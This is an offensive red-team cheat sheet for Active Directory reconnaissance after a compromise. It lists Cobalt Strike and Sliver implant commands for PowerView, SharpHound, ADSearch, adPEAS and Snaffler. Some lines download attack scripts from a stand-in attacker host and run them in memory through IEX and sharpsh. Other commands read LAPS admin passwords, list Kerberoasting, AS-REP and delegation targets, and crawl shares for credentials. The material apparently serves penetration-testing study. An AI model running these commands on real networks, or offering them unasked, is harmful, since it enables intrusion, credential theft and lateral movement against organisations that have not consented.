## Domain Recon

Domain-level enumeration after obtaining credentials — mapping the AD environment to identify attack paths.

> [!Important]
> Domain recon doesn't require a high integrity process. Running as SYSTEM can actually be detrimental.

---

### PowerView

Import PowerView via `powershell-import` (CS) or `sharpsh` (Sliver), then use its cmdlets. Results are proper PowerShell objects that support piping.

#### CS

```sh
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powershell Get-Domain
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
beacon> powershell Get-ForestDomain
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess

# Users — use -Identity for a specific user, otherwise returns all (slow)
beacon> powershell Get-DomainUser -Identity <user> -Properties DisplayName, MemberOf | fl

beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
beacon> powershell Get-DomainTrust
```

#### Sliver

```sh
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-Domain"'
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainComputer | select dnshostname"'
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainTrust"'
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainTrustMapping"'

# For commands with spaces/pipes, base64 encode with cyberchef and use -e -c flags
sharpsh -i -t 20 -- -u 'http://<attacker>/PowerView.ps1' -e -c <BASE64_ENCODED_COMMAND>
```

---

### SharpView

C# port of PowerView. No piping ability. Runs as an assembly.

#### CS

```sh
beacon> execute-assembly C:\Tools\SharpView.exe Get-Domain
beacon> execute-assembly C:\Tools\SharpView.exe Get-DomainUser -Identity <user>
beacon> execute-assembly C:\Tools\SharpView.exe Get-DomainComputer
```

#### Sliver

```sh
sharpview -- Get-Domain
sharpview -- 'Get-DomainComputer -Identity <host> -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
```

---

### ADSearch

Custom LDAP queries. Fewer built-ins than PowerView, but flexible.

#### CS

```sh
# All users
beacon> execute-assembly C:\Tools\ADSearch.exe --search "objectCategory=user"

# Groups ending in "admins"
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"

# Specific group with member attributes
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# Users with SPNs (Kerberoasting targets)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# AS-REP roasting targets
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Unconstrained delegation computers
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Constrained delegation
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Trusted domains
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain <domain> --attributes distinguishedName,name,flatName,trustDirection

# Output as JSON
beacon> execute-assembly C:\Tools\ADSearch.exe --search "objectCategory=user" --json
```

#### Sliver

```sh
execute-assembly /path/to/ADSearch.exe --search "(objectCategory=user)"
execute-assembly /path/to/ADSearch.exe --search "(objectCategory=trustedDomain)" --domain <domain> --attributes distinguishedName,name,flatName,trustDirection
```

---

### BloodHound / SharpHound

Visualise attack paths in the domain. Run SharpHound to collect data, import the ZIP into BloodHound.

#### CS

```sh
beacon> cd C:\Windows\tasks
beacon> execute-assembly C:\Tools\SharpHound.exe -C all --searchforest
beacon> execute-assembly C:\Tools\SharpHound.exe -d <other.domain> -C all --searchforest
```

#### Sliver

```sh
cd C:/Windows/tasks

# v2 (recommended)
execute-assembly -t 200 -- /path/SharpHound-v2.5.13.exe -C all --searchforest
execute-assembly -t 200 -- /path/SharpHound-v2.5.13.exe -d <domain> -C all --searchforest

# Legacy v1 — use if v2 misses edges
execute-assembly -t 200 -- /path/SharpHound-v1.1.1.exe -C All,GPOLocalGroup --searchforest

# Via PowerShell
sharpsh -t 20 -- '-u http://<attacker>/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'
```

#### Manual (Linux)

```sh
# BloodHound CE
bloodhound-ce-python -k -no-pass -c All -ns <dc_ip> -d <domain> -u <user> --zip

# Legacy
bloodhound-python -k -no-pass -c All -ns <dc_ip> -d <domain> -u <user> --zip
```

---

### PingCastle

AD health check with trust exploration. Downloads as a free binary (C#).

#### Sliver

```sh
cd C:/Windows/tasks
execute-assembly -t 200 /path/PingCastle.exe --healthcheck --explore-trust --explore-forest-trust --level Full --no-enum-limit --skip-null-session

# Target a specific domain
execute-assembly -t 200 /path/PingCastle.exe --server <domain> --healthcheck --explore-trust --explore-forest-trust --level Full --no-enum-limit --skip-null-session
```

---

### ADPeas

Automated AD enumeration via PowerShell. Use the light version (no embedded BloodHound).

#### Sliver

```sh
sharpsh -t 200 -- '-u http://<attacker>/adPEAS-Light.ps1 -c "Invoke-adPEAS"'

# Or load in a shell
IEX((new-object net.webclient).downloadstring('http://<attacker>/adPEAS-Light.ps1'))
Invoke-adPEAS
```

---

### Shares Enumeration

#### SharpShares

```sh
# CS
beacon> execute-assembly C:\Tools\SharpShares.exe /ldap:all

# Sliver
execute-assembly -t 200 /path/SharpShares.exe /ldap:all
```

#### Snaffler

Crawls shares and files for sensitive content (credentials, keys, configs). Best run from a `shell`.

```sh
# CS
beacon> execute-assembly C:\Tools\Snaffler.exe -s

# Sliver
execute-assembly -t 200 /path/Snaffler.exe -s
```

---

### Trust Enumeration

```sh
# PowerView — from CS or Sliver sharpsh
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainForeignGroupMember -Domain <foreign.domain>

# Foreign group members — users from another domain in local groups
beacon> powershell Get-DomainForeignGroupMember -Domain <domain>
beacon> powershell ConvertFrom-SID <SID>

# Cross-domain group members
beacon> powershell Get-DomainGroupMember -Identity "<group>" -Domain <domain> | select MemberName
```
